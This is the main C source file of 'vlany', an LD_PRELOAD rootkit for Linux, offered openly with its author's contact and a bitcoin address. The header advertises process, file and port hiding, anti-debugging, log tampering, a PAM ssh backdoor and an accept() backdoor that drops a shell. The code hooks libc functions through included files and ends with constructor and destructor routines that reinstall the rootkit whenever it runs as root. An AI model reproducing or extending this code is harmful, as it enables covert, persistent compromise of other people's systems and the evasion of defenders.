/* 
 *                                                                                       
 *    ██╗   ██╗██╗      █████╗ ███╗   ██╗██╗   ██╗
 *    ██║   ██║██║     ██╔══██╗████╗  ██║╚██╗ ██╔╝
 *    ██║   ██║██║     ███████║██╔██╗ ██║ ╚████╔╝ 
 *    ╚██╗ ██╔╝██║     ██╔══██║██║╚██╗██║  ╚██╔╝  
 *     ╚████╔╝ ███████╗██║  ██║██║ ╚████║   ██║   
 *      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
 *                                           
 *  LD_PRELOAD rootkit for x86, x86_64, and ARM architectures
 *  complete with gid based process hiding,
 *                xattr based file hiding,
 *                network port hiding,
 *                anti-detection, anti-debug,
 *                dynamic linker modifications,
 *                persistent (re)installation,
 *                execve commands,
 *                PAM (ssh/sftp) backdoor,
 *                accept() SSL/plaintext backdoor,
 *                easy-to-use installation script,
 *                incredibly robust configuration
 *                     
 *  contact: mem@xmpp.is, @mempodippy
 *  btc addr: 1FfLiA4P5KHzKUHgCnMCVguJUgYJ8edW4B
 *
 *  credits:
 *    http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/
 *    https://www.youtube.com/watch?v=oYgmwwlcLc0
 */

#define _GNU_SOURCE

// constants defined by config.py at runtime. all (important) strings are xor'd
#include "symbols/headers/const.h"

// list of linux includes and library headers used by vlany
#include "symbols/headers/includes.h"

// modified libc symbol prototypes
#include "symbols/headers/symbols.h"

// rootkit utilities
#include "symbols/util/xor.c" // (void xor(), void cleanup())
#include "symbols/util/owned.c" // (int owned())
// TODO:
// push complete user verification ASAP
//#include "symbols/util/ver_acc_exist.c" // (int ver_acc_exist())

// functions used to stay installed, hide files, forge files, and hide presence
#include "symbols/hiding/libdl/dlsym.c" // (void *dlsym(), void locate_dlsym(), void *locate_sym())
#include "symbols/util/dup.c" // (char *dup_call())
#include "symbols/util/procname.h" // (char *procname_self())
#include "symbols/hiding/reinstall.c" // (void reinstall(), int hide_vlany())
#include "symbols/hiding/hide_checks.c" // (int hidden_xattr(), int hidden(), int hiddenGID(), int hiddenDirectory())
#include "symbols/hiding/forge_proc_net.c" // (FILE *forge_proc_net_tcp())
#include "symbols/hiding/mem_maps.c" // (FILE *forge_mem_maps(), FILE *forge_mem_smaps())
#include "symbols/hiding/numa_maps.c" // (FILE *forge_numa_maps())
#include "symbols/hiding/libdl/dlinfo.c" // (int dlinfo())
#include "symbols/hiding/libdl/dladdr.c" // (int dladdr())

// libc rename*()
// http://linux.die.net/man/2/rename
// http://man7.org/linux/man-pages/man2/rename.2.html
#include "symbols/rename/rename.c" // (int rename())
#include "symbols/rename/renameat.c" // (int renameat())
#include "symbols/rename/renameat2.c" // (int renameat2())

// libc fread()
// http://linux.die.net/man/3/fread
#include "symbols/read/fgets.c"
#include "symbols/read/fread.c" // (size_t fread())

// lib?? flags
// no available man pages ANYWHERE, only outdated source code
#include "symbols/flags/fgetflags.c" // (int fgetflags())
#include "symbols/flags/fsetflags.c"

// libc file permission functions
// chmod(), chown(), fchmod(), fchown(), fchownat(), lchown()
// http://linux.die.net/man/3/chmod
// http://linux.die.net/man/3/chown
// http://linux.die.net/man/3/fchmod
// http://linux.die.net/man/3/fchown
// http://linux.die.net/man/2/fchownat
// http://linux.die.net/man/3/lchown
#include "symbols/permissions/chmod.c" // (int chmod())
#include "symbols/permissions/chown.c" // (int chown())
#include "symbols/permissions/fchmod.c" // (int fchmod())
#include "symbols/permissions/fchown.c" // (int fchown())
#include "symbols/permissions/fchownat.c" // (int fchownat())
#include "symbols/permissions/lchown.c" // (int lchown())

// libc file *stat() functions
// http://linux.die.net/man/2/stat
// https://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/baselib---xstat.html
// struct stat {
//    dev_t     st_dev;     /* ID of device containing file */
//    ino_t     st_ino;     /* inode number */
//    mode_t    st_mode;    /* protection */
//    nlink_t   st_nlink;   /* number of hard links */
//    uid_t     st_uid;     /* user ID of owner */
//    gid_t     st_gid;     /* group ID of owner */
//    dev_t     st_rdev;    /* device ID (if special file) */
//    off_t     st_size;    /* total size, in bytes */
//    blksize_t st_blksize; /* blocksize for file system I/O */
//    blkcnt_t  st_blocks;  /* number of 512B blocks allocated */
//    time_t    st_atime;   /* time of last access */
//    time_t    st_mtime;   /* time of last modification */
//    time_t    st_ctime;   /* time of last status change */
// };
#include "symbols/stat/stat.c" // (int stat(), int stat64())
#include "symbols/stat/fstat.c" // (int fstat(), int fstat64())
#include "symbols/stat/lstat.c" // (int lstat(), int lstat64())
#include "symbols/stat/xstat.c" // (int __xstat(), int __xstat64())
#include "symbols/stat/fxstat.c" // (int __fxstat(), int __fxstat64())
#include "symbols/stat/lxstat.c" // (int __lxstat(), int __lxstat64())

// libc extended file attributes functions
// http://man7.org/linux/man-pages/man2/setxattr.2.html
// http://man7.org/linux/man-pages/man2/getxattr.2.html
// http://man7.org/linux/man-pages/man2/listxattr.2.html
#include "symbols/xattr/set/setxattr.c" // (int setxattr())
#include "symbols/xattr/set/lsetxattr.c" // (int lsetxattr())
#include "symbols/xattr/set/fsetxattr.c" // (int fsetxattr())
#include "symbols/xattr/get/getxattr.c" // (int getxattr())
#include "symbols/xattr/get/lgetxattr.c" // (int lgetxattr())
#include "symbols/xattr/get/fgetxattr.c" // (int fgetxattr())
#include "symbols/xattr/list/listxattr.c" // (int listxattr())
#include "symbols/xattr/list/llistxattr.c" // (int llistxattr())
#include "symbols/xattr/list/flistxattr.c" // (int flistxattr())
#include "symbols/xattr/remove/removexattr.c" // (int removexattr())
#include "symbols/xattr/remove/lremovexattr.c" // (int lremovexattr())
#include "symbols/xattr/remove/fremovexattr.c" // (int fremovexattr())

// libc ptrace() function
// http://man7.org/linux/man-pages/man2/ptrace.2.html
#include "symbols/hiding/debug/ptrace.c" // (long ptrace())

// libc fputs() function
// http://www.manpagez.com/man/3/fputs/
#include "symbols/write/fputs.c" // (int fputs_unlocked())

// libc execve() function - where all the good execve command stuff happens :)
// http://linux.die.net/man/2/execve
#include "symbols/exec/execve.c" // (int execve())
#include "symbols/exec/execvp.c" // (int execvp())

// libc file linking functions
// http://linux.die.net/man/2/link
// http://linux.die.net/man/2/linkat
// http://linux.die.net/man/2/unlink
// http://linux.die.net/man/2/unlinkat
// http://linux.die.net/man/2/symlink
// http://linux.die.net/man/2/symlinkat
#include "symbols/links/link.c" // (int link())
#include "symbols/links/linkat.c" // (int linkat())
#include "symbols/links/unlink.c" // (int unlink())
#include "symbols/links/unlinkat.c" // (int unlinkat())
#include "symbols/links/symlink.c" // (int symlink())
#include "symbols/links/symlinkat.c" // (int symlinkat())

// libc directory functions
// http://linux.die.net/man/2/mkdir
// http://linux.die.net/man/2/mkdirat
// http://linux.die.net/man/2/rmdir
// http://linux.die.net/man/3/opendir
// http://linux.die.net/man/3/readdir
// http://linux.die.net/man/2/chdir
// struct dirent {
//    ino_t          d_ino;       /* inode number */
//    off_t          d_off;       /* offset to the next dirent */
//    unsigned short d_reclen;    /* length of this record */
//    unsigned char  d_type;      /* type of file; not supported
//                                   by all file system types */
//    char           d_name[256]; /* filename */
// };
#include "symbols/dir/mkdir.c" // (int mkdir())
#include "symbols/dir/mkdirat.c" // (int mkdirat())
#include "symbols/dir/rmdir.c" // (int rmdir())
#include "symbols/dir/opendir.c" // (DIR *opendir(), DIR *opendir64())
#include "symbols/dir/fdopendir.c" // (DIR *fdopendir())
#include "symbols/dir/readdir.c" // (struct dirent *readdir(), struct dirent64 *readdir64)
#include "symbols/dir/chdir.c" // (int chdir())
#include "symbols/dir/fchdir.c" // (int fchdir())

// libc file open functions
// http://linux.die.net/man/2/access
// http://linux.die.net/man/2/open
// http://linux.die.net/man/3/fopen
#include "symbols/open/access.c" // (int access())
#include "symbols/open/open.c" // (int open(), int open64())
#include "symbols/open/fopen.c" // (FILE *fopen(), FILE *fopen64())

/*
 * everything after this comment is backdoor functionality
 */

// libc logging functions
// http://linux.die.net/man/3/audit_log_acct_message
// http://linux.die.net/man/3/audit_log_user_message
// (there's actually no online or offline man page for audit_send... go figure.)
#include "symbols/audit/audit_log_acct_message.c" // (int audit_log_acct_message())
#include "symbols/audit/audit_log_user_message.c" // (int audit_log_user_message())
#include "symbols/audit/audit_send.c" // (int audit_send())

// some more libc logging functions
// http://linux.die.net/man/2/syslog
// https://refspecs.linuxbase.org/LSB_4.0.0/LSB-Core-generic/LSB-Core-generic/libc---syslog-chk-1.html
#include "symbols/syslog/syslog.c" // (void syslog())
#include "symbols/syslog/__syslog_chk.c" // (void void __syslog_chk())

// utmp/wtmp libc functions
// even though getutent is of struct utmp and getutxent is of struct utmpx,
// both structs are fundamentally exactly the same.
// some Linux distros don't use utmpx, and instead resort to the login() function.
// http://linux.die.net/man/3/getutent
// struct utmp {
//     short   ut_type;              /* Type of record */
//     pid_t   ut_pid;               /* PID of login process */
//     char    ut_line[UT_LINESIZE]; /* Device name of tty - "/dev/" */
//     char    ut_id[4];             /* Terminal name suffix,
//                                      or inittab(5) ID */
//     char    ut_user[UT_NAMESIZE]; /* Username */
//     char    ut_host[UT_HOSTSIZE]; /* Hostname for remote login, or
//                                      kernel version for run-level
//                                      messages */
//     struct  exit_status ut_exit;  /* Exit status of a process
//                                      marked as DEAD_PROCESS; not
//                                      used by Linux init (1 */
//     /* The ut_session and ut_tv fields must be the same size when
//        compiled 32- and 64-bit.  This allows data files and shared
//        memory to be shared between 32- and 64-bit applications. */
//     #if __WORDSIZE == 64 && defined __WORDSIZE_COMPAT32
//         int32_t ut_session;           /* Session ID (getsid(2)),
//                                          used for windowing */
//         struct {
//             int32_t tv_sec;           /* Seconds */
//             int32_t tv_usec;          /* Microseconds */
//         } ut_tv;                      /* Time entry was made */
//     #else
//         long   ut_session;           /* Session ID */
//         struct timeval ut_tv;        /* Time entry was made */
//     #endif
//
//         int32_t ut_addr_v6[4];        /* Internet address of remote
//                                          host; IPv4 address uses
//                                          just ut_addr_v6[0] */
//         char __unused[20];            /* Reserved for future use */
// };
#include "symbols/utmp/getutent.c"
#include "symbols/utmp/getutxent.c"
#include "symbols/utmp/getutid.c"
#include "symbols/utmp/getutxid.c"
#include "symbols/utmp/pututline.c"
#include "symbols/utmp/pututxline.c"
#include "symbols/utmp/getutmp.c"
#include "symbols/utmp/getutmpx.c"
#include "symbols/utmp/updwtmp.c"
#include "symbols/utmp/updwtmpx.c"
#include "symbols/utmp/login.c"

// i had to break socket so that it would read from /proc/net/tcp (or our fake one :p)
#include "symbols/hiding/socket.c"

// hiding our network traffic by fucking with libpcap functions :)
#include "symbols/pcap/pcap.h"
#include "symbols/pcap/pcap.c"

// gid related stuff, make it impossible for the rk user to change their gid from the magic gid
// just a safe-guard :)
// http://linux.die.net/man/2/setgid
// http://linux.die.net/man/2/setregid
// http://linux.die.net/man/2/setresgid
#include "symbols/gid/setgid.c" // (int setgid())
#include "symbols/gid/setegid.c" // (int setegid()) -- prevents screen from changing the effective gid
#include "symbols/gid/setregid.c" // (int setregid())
#include "symbols/gid/setresgid.c" // (int setresgid())

// pam (ssh/sftp) backdoor stuff. thanks for being so gay libc.
// http://linux.die.net/man/3/getpwnam
// http://linux.die.net/man/3/getspnam
#include "symbols/passwd/getpwnam.c" // (struct passwd *getpwnam())
#include "symbols/passwd/getpwuid.c" // (struct passwd *getpwuid())
#include "symbols/passwd/getpwent.c" // (struct passwd *getpwent())
#include "symbols/passwd/getspnam.c" // (struct spwd *getspnam())
#include "symbols/passwd/getpwnam_r.c" // (int getpwnam_r())

// pam backdoor includes. thanks for being so straight libpam.
// http://linux.die.net/man/3/pam_vprompt
// http://linux.die.net/man/3/pam_authenticate
// http://linux.die.net/man/3/pam_open_session
// http://linux.die.net/man/3/pam_acct_mgmt
#include "symbols/backdoor/pam/pam_vprompt.c" // (_pam_overwrite(x), _pam_drop(X), int pam_vprompt(), int pam_prompt())
#include "symbols/backdoor/pam/pam.c" // (int pam_authenticate(), int pam_open_session(), int pam_acct_mgmt())

// accept() backdoor includes. only libc function we fuck with is accept().
// http://linux.die.net/man/3/accept
#ifdef SSL_BACKDOOR
#include "symbols/backdoor/accept/ssl.h" // (SSL_CTX *ctx, SSL *ssl)
#include "symbols/backdoor/accept/ssl.c" // (SSL_CTX *InitCTX(), int gen_cert())
#include "symbols/backdoor/accept/connect_loops.c" // (void cmd_loop(), int write_loop())
#endif
#include "symbols/backdoor/accept/backconnect.c" // (void pbackconnect(), void backconnect())
#include "symbols/backdoor/accept/drop_shell.c" // (int drop_shell())
#include "symbols/backdoor/accept/accept.c" // (int accept())

void __attribute ((constructor)) init (void)
{
    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
    char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
    HOOK(old_opendir, COPENDIR);
    DIR *check_presence = old_opendir(install_dir); // does our hidden directory still exist?
    if(check_presence && errno != ENOENT && geteuid() == 0) { closedir(check_presence); reinstall(); } // then REWRITE IT AAAALL
    CLEAN(install_dir);
}

void __attribute ((destructor)) vexit (void)
{
    if(getenv("LD_PRELOAD") != NULL) unsetenv("LD_PRELOAD");
    char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
    HOOK(old_opendir, COPENDIR);
    DIR *check_presence = old_opendir(install_dir);
    if(check_presence && errno != ENOENT && geteuid() == 0) { closedir(check_presence); reinstall(); }
    CLEAN(install_dir);
}
